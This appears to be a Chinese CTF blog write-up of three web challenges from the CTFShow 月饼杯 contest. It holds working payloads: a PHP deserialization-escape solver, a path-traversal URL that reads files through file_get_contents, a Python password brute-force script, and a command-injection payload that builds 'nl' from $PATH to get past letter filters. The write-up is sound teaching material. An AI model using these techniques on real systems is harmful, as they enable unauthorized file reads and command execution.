---
title: CTFShow月饼杯
date: 2020-09-28 21:21:04
updated: 2020-09-28 21:21:04
categories: Write up
---

CTFShow月饼杯,学到了很多<!--more-->

# web1_此夜圆

题目描述：一江春水何年尽，万古清光此夜圆

挺简单的一题，考察反序列化字符逃逸

附下解题脚本，过程就不写了

```php
<?php
error_reporting(0);

class a
{
    public $uname='FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}';
    public $password=1;
//    public function __construct($uname,$password)
//    {
//        $this->uname=$uname;
//        $this->password=$password;
//    }
    public function __wakeup()
    {
        if($this->password==='yu22x')
        {
            echo '123';
        }
        else
        {
            echo 'wrong password';
        }
    }
}

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}


$ser=filter(serialize(new a($uname,$password)));
print ($ser);
echo "\n";

print (unserialize($ser));
?>
```

payload:

```
1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```



# web2_故人心



题目描述：三五夜中新月色，二千里外故人心

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a=$_GET['a'];
$b=$_GET['b'];
$c=$_GET['c'];
$url[1]=$_POST['url'];
if(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0){
    $d = ($b==hash("md2", $b)) && ($c==hash("md2",hash("md2", $c)));
    if($d){
             highlight_file('hint.php');
             if(filter_var($url[1],FILTER_VALIDATE_URL)){
                $host=parse_url($url[1]);
                print_r($host); 
                if(preg_match('/ctfshow\.com$/',$host['host'])){
                    print_r(file_get_contents($url[1]));
                }else{
                    echo '差点点就成功了！';
                }
            }else{
                echo 'please give me url!!!';
            }     
    }else{
        echo '想一想md5碰撞原理吧?!';
    }
}else{
    echo '第一个都过不了还想要flag呀?!';
}
<?php 
$flag="flag in /fl0g.txt";
```

**第一关 绕过a**

```
需要绕过 is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0
```

php小数点后超过161位做平方运算时会被截断,我们可以用科学计数法来代替，即 `1e-162 `

![](https://img.npfs06.top/20210405212700.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

这里的三个 if语句都可以执行成功，可以自己尝试下

**第二关 绕过b c**

有个提示，按提示写脚本即可，做法类似 MD5爆破

![](https://img.npfs06.top/20210405212716.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)


![](https://img.npfs06.top/20210405212727.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



**第三关 url**

考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF
php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。

- FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href='https://www.runoob.com/php/filter-validate-url.html' target='_blank'>https://www.runoob.com/php/filter-validate-url.html</a>

题目中要求url中存在 ctfshow.com,又要构造符合url格式
我们可以构造类似 a://ctfshow.com/../../../  这样的url，又因为我们需要查看fl0g.txt文件

最终payload为 url=a://ctfshow.com/../../../../../fl0g.txt



# web3_莫负婵娟

题目描述：皎洁一年惟此夜，莫教容易负婵娟

查看源码，可以发现一些提示

```
like 模糊匹配

% 表示零个或多个字符的任意字符串
_（下划线）表示任何单个字符
[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符
[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符
* 它同于DOS命令中的通配符，代表多个字符
？同于DOS命令中的？通配符，代表单个字符
# 大致同上，不同的是代只能代表单个数字
```

这里的话大部分字符都被过滤了，但是_(下划线)没有，添加N个 _ (下划线）可以知道密码长度为32

![](https://img.npfs06.top/20210405212740.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

```php
import requests

a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
url = 'http://b1390a07-2ecc-422e-a3e5-0c80c4d66024.chall.ctf.show/login.php'

pwd = ''
for i in range(32):
    print('i = '+str(i+1),end='\t')
    for j in a:
        password = pwd + j + (31 - i) * '_'
        data = {'username':'yu22x','password':password}
        r = requests.post(url,data=data)
        if 'wrong' not in r.text:
             pwd += j
             print(pwd)
             break
```

密码：67815b0c009ee970fe4014abaa3Fa6A0 ；用户名：yu22x  

bp抓包 爆破，发现小写字母全被过滤了
但是可以使用：大写字母，数字，{ }，空格，$，~

题目有个hint

```
环境变量 +linux字符串截取 + 通配符
```

先放payload：ip=0;${PATH:14:1}${PATH:5:1}  ????.???

做法：**使用$PATH环境变量来截取字母**

![](https://img.npfs06.top/20210405212759.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210405212807.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

需要读取 flag.txt

但是我在本地的$PATH路径上找不到 t  ....

所以用 nl

![](https://img.npfs06.top/20210405212817.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

查看源码即可得到flag